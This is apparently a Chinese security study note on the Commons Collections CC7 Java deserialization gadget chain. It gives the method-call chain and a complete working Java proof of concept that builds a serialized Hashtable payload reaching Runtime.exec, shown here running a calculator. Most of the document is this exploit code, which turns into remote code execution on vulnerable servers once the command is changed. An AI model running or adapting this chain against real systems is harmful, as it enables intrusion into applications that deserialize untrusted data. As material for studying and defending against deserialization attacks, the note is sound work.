---
title: CC7
date: 2026-02-08 18:59:33
updated: 2026-02-09 19:46:47
tags:
  - Web
  - java
  - 反序列化
  - CC链
---
| **Gadget Chain** | **CC 版本依赖** | **JDK 版本限制** | **核心入口点 (Source)** | **核心特征/用途** |
| --- | --- | --- | --- | --- |
| **CC7** | 3.1 - 3.2.1 | **无限制** | `Hashtable` | `Hashtable`<br>变体，用于特殊环境下 `HashSet`<br>被禁用的情况。 |

```java
/*
    Payload method chain:

    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    org.apache.commons.collections.functors.ChainedTransformer.transform
    org.apache.commons.collections.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    java.lang.Runtime.exec
*/

LazyMap.equals() -> AbstractMapDecorator.equals() //LazyMap.equals extends AbstractMapDecorator
-> HashMap.equals() -> AbstractMap.equals() //HashMap extends AbstractMap
```
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.*;

public class CC7 {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})};
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});

        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();

        Map lazymap1 = LazyMap.decorate(hashMap1, chainedTransformer);
        Map lazymap2 = LazyMap.decorate(hashMap2, chainedTransformer);//通过lazymap2的chainedTransformer触发
        lazymap1.put("yy",1);
        lazymap2.put("zZ",1);

        Hashtable<Object, Object> hashtable = new Hashtable<>();
        hashtable.put(lazymap1, 1);
        hashtable.put(lazymap2, 1);

        Class c = chainedTransformer.getClass();
        Field iTransformers = c.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer, transformers);
        lazymap2.remove("yy");//hashtable.put(lazymap2, 1);会给hashMap2新增"yy"->"yy"，造成反序列化时reconstitutionPut方法中无法满足e.hash == hash，因此remove
        //e.key.equals(key) -> lazyMap1.equals(lazyMap2) -> hashMap1.equals(lazyMap2) -> AbstractMap.equals(lazyMap2)
        serialize(hashtable);
        unserialize("bin.ser");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("bin.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        return ois.readObject();
    }
}

```